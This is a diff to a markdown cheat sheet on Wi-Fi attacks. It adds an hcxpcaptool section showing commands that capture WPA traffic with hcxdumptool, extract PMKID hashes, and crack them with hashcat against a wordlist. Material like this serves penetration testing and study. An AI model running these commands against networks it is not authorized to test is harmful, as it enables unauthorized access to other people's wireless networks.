@@ -7,7 +7,7 @@
   * [Collecting and Cracking](#collecting-and-cracking)
   * [WEP without clients](#wep-without-clients)
   * [WPA/WPA2 with clients](#wpawpa2-with-clients)
-  * [aircrack-ng Suite](#aircrack-ng)
+  * [aircrack-ng](#aircrack-ng)
     * [airmon-ng](#airmon-ng)
     * [aireplay-ng](#aireplay-ng)
     * [Quick summary](#quick-summary)
@@ -19,7 +19,8 @@
     * [Fragmentation attack](#fragmentation-attack)
     * [packetforge-ng](#packetforge-ng)
   * [pyrit](#pyrit)
-  * [hcxdumptoo](#hcxdumptool)
+  * [hcxdumptool](#hcxdumptool)
+    * [hcxpcaptool](#hcxpcaptool)
   * [wifite](#wifite)
 * [Quick &amp; Useful](#quick--useful)
   * [Loops](#loops)
@@ -248,12 +249,22 @@ $ iwconfig wlan1mon mode monitor
 $ ip link set wlan1mon up
 ```
 
-Save the target BSSIDs to a file. Begin capturing with filtered parameters. 
+Save the target BSSIDs to a file. Begin capturing with filtered parameters.
 ```bash
 $ hcxdumptool -i wlan1mon --enable_status -c 1 -o capture.pcapng --filterlist=filter_list --filtermode=2
 ```
+_Section not finished._
 
-asdf
+#### hcxpcaptool
+Use `hcxpcaptool` to extract the PMK hash IDs.
+```bash
+$ hcxpcaptool -z pmkidhash capture.cap
+```
+
+Run `hashcat` to attempt to decrypt the PMK hash IDs.
+```bash
+$ hashcat -m 16800 pmkidhash /usr/share/wordlists/cyberpunk.words --force
+```
 
 ### wifite
 [wifite](https://github.com/derv82/wifite2) is a tool that automates the process. Follow the instructions to cheat.
@@ -280,7 +291,7 @@ $ ip link set wlan0mon down
 $ ip link set wlan0mon up
 ```
 
-Set modes monitor or managed. 
+Set modes monitor or managed.
 ```bash
 $ iwconfig wlan0mon mode managed
 $ iwconfig wlan0mon mode monitor
